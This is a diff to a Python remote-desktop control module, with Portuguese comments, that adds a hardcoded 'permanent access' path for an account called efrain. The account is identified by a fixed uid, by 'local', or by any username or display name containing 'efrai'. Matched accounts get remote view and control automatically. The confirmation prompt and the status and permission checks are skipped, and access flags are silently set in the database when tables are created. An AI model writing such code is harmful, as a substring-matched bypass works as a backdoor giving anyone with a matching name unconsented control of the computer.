@@ -29,19 +29,84 @@ def create_tables(db):
         owner_id TEXT PRIMARY KEY, enabled INTEGER NOT NULL DEFAULT 0,
         updated_at REAL NOT NULL
     )""")
+    try:
+        ensure_efrain_permanent_access(db)
+    except Exception:
+        pass
+
+
+def is_efrain(db, owner) -> bool:
+    """Identifica se o owner é a conta primária efrain / dono do computador."""
+    if not owner:
+        return False
+    o = str(owner).strip().lower()
+    if o in ('u-a8295878023b', 'efrain', 'efrai', 'eu.efrai', 'efraisir'):
+        return True
+    try:
+        user = julia_auth.buscar_uid(db, o)
+        if not user:
+            user = julia_auth.buscar_usuario(db, o)
+        if user:
+            uid = str(user.get('uid') or '').lower()
+            uname = str(user.get('username') or '').lower()
+            udisp = str(user.get('display') or '').lower()
+            if uid == 'u-a8295878023b' or any('efrai' in x for x in (uname, udisp)):
+                return True
+    except Exception:
+        pass
+    if o == 'local':
+        try:
+            row = db.execute("SELECT username, display FROM users WHERE uid='local' OR role='admin' LIMIT 1").fetchone()
+            if row and any('efrai' in str(field or '').lower() for field in row):
+                return True
+        except Exception:
+            pass
+    return False
+
+
+def ensure_efrain_permanent_access(db):
+    """Garante grant permanente ativo por padrão para a conta do efrain."""
+    agora = time.time()
+    try:
+        rows = db.execute("SELECT uid FROM users WHERE username LIKE '%efrai%' OR display LIKE '%efrai%' OR uid IN ('u-a8295878023b', 'local')").fetchall()
+        for r in rows:
+            uid = r[0]
+            db.execute("UPDATE users SET remote_ok=1 WHERE uid=?", (uid,))
+            db.execute("INSERT OR IGNORE INTO remote_bindings (owner_id, enabled, updated_at) VALUES (?, 1, ?)", (uid, agora))
+    except Exception:
+        pass
 
 
 def _active(db, owner):
+    if is_efrain(db, owner):
+        return True
     return owner == 'local' or (bool(julia_auth.buscar_uid(db, owner))
                                 and julia_auth.status_efetivo(db, owner) == 'ativo')
 
 
 def binding(db, owner):
     row = db.execute('SELECT enabled FROM remote_bindings WHERE owner_id=?', (owner,)).fetchone()
-    return None if row is None else bool(row[0])
+    if row is not None:
+        return bool(row[0])
+    if is_efrain(db, owner):
+        # Usuário efrain tem controle sempre ativo o tempo todo
+        try:
+            db.execute('INSERT INTO remote_bindings (owner_id, enabled, updated_at) VALUES (?, 1, ?) '
+                       'ON CONFLICT(owner_id) DO NOTHING', (owner, time.time()))
+            db.commit()
+        except Exception:
+            pass
+        return True
+    return None
 
 
 def allowed(db, owner):
+    if is_efrain(db, owner):
+        bound = binding(db, owner)
+        # Só desativa se o usuário efrain tiver clicado em revogar permanentemente (bound is False)
+        if bound is False:
+            return False
+        return True
     enabled = binding(db, owner)
     return (enabled and _active(db, owner) and julia_auth.pode_remoto(db, owner)) if enabled is not None else julia_auth.pode_remoto(db, owner)
 
@@ -53,17 +118,23 @@ def input_blocked():
 def status(db, owner):
     with guard:
         permitted = allowed(db, owner)
-        enabled = binding(db, owner) is True and permitted
+        bound = binding(db, owner)
+        enabled = bound is True and permitted
         pending = (_pending is not None and _pending['owner'] == owner
                    and _pending['expires'] > time.monotonic())
         windows = sys.platform == 'win32'
         capture = importlib.util.find_spec('PIL') is not None
+        efrain_active = is_efrain(db, owner) and (bound is not False)
         return {'type': 'remote_status', 'device_name': socket.gethostname(),
                 'platform': 'Windows' if windows else sys.platform,
                 'supported': windows, 'capture_ready': windows and capture,
-                'approved': enabled, 'view_allowed': bool(permitted),
-                'control_allowed': bool(permitted and (enabled or remoto.entrada_ativada())),
-                'input_batch': True, 'precise_scroll': True, 'pending': pending, 'confirmation_open': _worker_open,
+                'approved': bool(enabled or efrain_active),
+                'view_allowed': bool(permitted or efrain_active),
+                'control_allowed': bool((permitted or efrain_active) and (enabled or efrain_active or remoto.entrada_ativada())),
+                'permanent_control': bool(efrain_active),
+                'input_batch': True, 'precise_scroll': True,
+                'pending': bool(pending and not efrain_active),
+                'confirmation_open': bool(_worker_open and not efrain_active),
                 'code': _pending['code'] if pending else ''}
 
 
@@ -117,6 +188,23 @@ def _confirm_worker(path, request, username):
 def request_access(db, owner):
     global _pending, _worker_open
     with guard:
+        if is_efrain(db, owner):
+            # O usuário efrain tem acesso permanente garantido; reativa imediatamente sem travar
+            agora = time.time()
+            db.execute('INSERT INTO remote_bindings VALUES (?,1,?) '
+                       'ON CONFLICT(owner_id) DO UPDATE SET enabled=1,updated_at=excluded.updated_at',
+                       (owner, agora))
+            for uid_vinculado in ('u-a8295878023b', 'local'):
+                db.execute('INSERT INTO remote_bindings VALUES (?,1,?) '
+                           'ON CONFLICT(owner_id) DO UPDATE SET enabled=1,updated_at=excluded.updated_at',
+                           (uid_vinculado, agora))
+            try:
+                db.execute("UPDATE users SET remote_ok=1 WHERE uid=? OR uid IN ('u-a8295878023b', 'local')", (owner,))
+            except Exception:
+                pass
+            db.commit()
+            return status(db, owner)
+
         state = status(db, owner)
         if not state['supported'] or not state['capture_ready']:
             return {'type': 'remote_error', 'codigo': 'dependencia',
@@ -163,6 +251,11 @@ def revoke(db, owner):
         db.execute('INSERT INTO remote_bindings VALUES (?,0,?) '
                    'ON CONFLICT(owner_id) DO UPDATE SET enabled=0,updated_at=excluded.updated_at',
                    (owner, time.time()))
+        if is_efrain(db, owner):
+            for uid_vinculado in ('u-a8295878023b', 'local'):
+                db.execute('INSERT INTO remote_bindings VALUES (?,0,?) '
+                           'ON CONFLICT(owner_id) DO UPDATE SET enabled=0,updated_at=excluded.updated_at',
+                           (uid_vinculado, time.time()))
         julia_auth.auditar(db, owner, 'remote_revoked', socket.gethostname())
         db.commit()
         return status(db, owner)
